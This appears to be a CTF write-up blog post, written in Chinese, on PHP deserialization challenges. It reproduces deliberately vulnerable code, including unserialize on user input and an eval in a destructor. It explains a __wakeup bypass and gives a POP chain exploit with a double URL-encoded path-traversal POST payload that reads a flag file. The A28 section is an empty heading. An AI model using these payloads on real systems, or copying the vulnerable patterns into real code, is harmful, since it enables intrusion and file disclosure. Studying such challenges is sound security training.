---
title: PHP 反序列化题记录
date: 2024-08-15 16:46:12
categories:
    - writeup
tags:
    - ctf
    - writeup
    - 笔记
katex: true
cover: https://yutori-natsu.github.io/images/wpphp.jpg
---

### A25 - mew

```php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
include 'flag.php';
class Name{
    public $username = 'nonono';
    public $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
```

PHP/5.6.24
入门级反序列化，序列化对象数跳过 `__wakeup()` 方法。

### A26 - serializable

```php
error_reporting(0);
class evil{
    public $cmd;
    public $a;
    public function __destruct(){
        eval($this->cmd.'114514');
    }
}
if(!preg_match('/^[Oa]:[\d]+|Array|Iterator|Object|List/i',$_GET['Pochy'])){
    unserialize($_GET['Pochy']);
} else {
    die("hacker!");
}
```

PHP/8.1.9
这个版本不能通过 `O:+4` 这样的添加加号绕过正则。
没有什么头猪，以后再看看吧

### A27 - ezpop

```php
<?php
class night {
    public $night;
    public function __destruct() {
        echo $this->night . '哒咩哟';
    }
}
class day {
    public $day;
    public function __toString() {
        echo $this->day->go();
    }
    public function __call($a, $b) {
        echo $this->day->getFlag();
    }
}
class light {
    public $light;
    public function __invoke() {
        echo $this->light->d();
    }
}
class dark {
    public $dark;
    public function go() {
        ($this->dark)();
    }
    public function getFlag() {
        include(hacked($this->dark));
    }
}
function hacked($s) {
    if(substr($s, 0,1) == '/') {
        die('呆jio步');
    }
    $s = preg_replace('/\.\.*/', '.', $s);
    $s = urldecode($s);
    $s = htmlentities($s, ENT_QUOTES, 'UTF-8');
    return strip_tags($s);
}
$un = unserialize($_POST['pop']);
throw new Exception('seino');
```

PHP/7.4.33
构造 POP 链，前半部分 exp 如下：

```php
$p = new night;
$p -> night = new day;
$p -> night -> day = new dark;
$p -> night -> day -> dark = new light;
$p -> night -> day -> dark -> light = new day;
$p -> night -> day -> dark -> light -> day = new dark;
$p -> night -> day -> dark -> light -> day -> dark = $path;
$sp = serialize($p);
$sp = substr($sp, 0, strlen($sp)-1);
echo "\n" . $sp . "\n";
```

该版本的一个特性：若 `$unserialize` 过程中出错，则会在报错之后直接执行 `$__destruct$`，跳过后续的 `throw new Exception`. 考虑如何绕过字符串拦截：由于 `$s` 是先正则再 urldecode，所以可以在传入 `$s` 时用 `%2e` 和 `%2f` 分别替代 `.` 和 `/`，由于传输过程中有一次 urldecode，所以在 POST 数据包内应该用 `%252e` 代表 `$s` 中的 `%2e`. 注意此时的序列化字符串中 path 的长度不应该用 `%252e` 的长度计算，而应该用 `%2e` 计算。最终的 POST 如下：

```plain
pop=O:5:"night":1:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:40:"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fflag";}}}}
```

注意此处的 `s:40:"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fflag"` 中 40 不代表后方字符串的原始长度，而是 urldecode 一次之后的长度。为了保证所有属性都解析完毕后再报错，删除了序列化字符串结尾的一个花括号。

    备注：用 php-cgi -f index.php 'q1=v1' 在 docker 内手动模拟 GET 请求

### A28 - ex-phar
